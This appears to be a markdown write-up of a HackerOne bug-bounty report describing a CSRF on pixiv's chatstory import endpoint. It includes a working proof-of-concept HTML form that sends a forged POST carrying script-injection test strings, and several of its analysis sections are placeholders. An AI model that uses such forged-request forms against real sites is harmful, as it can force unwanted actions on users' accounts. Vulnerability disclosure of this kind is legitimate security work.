@@ -1,0 +1,91 @@
+# CSRF at https://chatstory.pixiv.net/imported
+
+## Metadata
+- **Source:** HackerOne
+- **Report:** 534908 | https://hackerone.com/reports/534908
+- **Submitted:** 2019-04-11
+- **Reporter:** katsuragicsl
+- **Program:** Unknown
+- **Bounty:** $500
+- **Severity:** medium
+- **Vuln:** Cross-Site Request Forgery (CSRF)
+- **CVEs:** None
+- **Category:** web-api
+
+## Summary
+## Summary:
+
+A CSRF in `https://chatstory.pixiv.net/imported` can trick users to import a novel of the attacker as the users' chatstory.
+
+## Steps To Reproduce:
+
+  1. Attacker creates a novel
+  2. Go to the novel (https://www.pixiv.net/novel/show.php?id=10997105) Import the novel as chatstory by clicking the "チャットストーリーを作る" on the sidebar. You show notice that the actual request to create a chatsto
+
+## Attack scenario
+*(see original)*
+
+## Root cause
+*(see original)*
+
+## Attacker mindset
+*(see original)*
+
+## Defensive takeaways
+*(see original)*
+
+## Variant hunting
+*(see original)*
+
+## MITRE ATT&CK
+*(see original)*
+
+## Notes
+*(see original)*
+
+## Full report
+<details><summary>Expand</summary>
+
+## Summary:
+
+A CSRF in `https://chatstory.pixiv.net/imported` can trick users to import a novel of the attacker as the users' chatstory.
+
+## Steps To Reproduce:
+
+  1. Attacker creates a novel
+  2. Go to the novel (https://www.pixiv.net/novel/show.php?id=10997105) Import the novel as chatstory by clicking the "チャットストーリーを作る" on the sidebar. You show notice that the actual request to create a chatstory is a POST request to `https://chatstory.pixiv.net/imported` with body
+
+`id=<novel_id>&text=<something>&comment=<something>&title=<something>&user_id=<attacker_id>&x_restrict=0&is_original=true`
+
+  3. Use the above information to create a http post form. The <attacker_id> doesn't matter. 
+
+## Supporting Material/References:
+
+Please see the following "living" PoC:
+
+`<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://chatstory.pixiv.net/imported" method="POST">
+      <input type="hidden" name="id" value="10997105" />
+      <input type="hidden" name="text" value="test&lt;script&gt;alert&#40;1&#41;&lt;&#47;script&gt;&#13;&#10;&#13;&#10;&#13;&#10;Title&#13;&#10;&#13;&#10;Normal&#13;&#10;&#13;&#10;Jump&#13;&#10;&#13;&#10;&#13;&#10;" />
+      <input type="hidden" name="comment" value="test&amp;lt&#59;script&amp;gt&#59;alert&#40;1&#41;&amp;lt&#59;&#47;script&amp;gt&#59;" />
+      <input type="hidden" name="tags" value="&#35;test" />
+      <input type="hidden" name="title" value="test&lt;script&gt;alert&#40;1&#41;&lt;&#47;script&gt;" />
+      <input type="hidden" name="user&#95;id" value="39570048" />
+      <input type="hidden" name="x&#95;restrict" value="0" />
+      <input type="hidden" name="is&#95;original" value="true" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+`
+
+## Impact
+
+Trick users to import novel of attacker as a chatstory
+
+</details>
+
+---
+*Analysed by Claude on 2026-05-24*
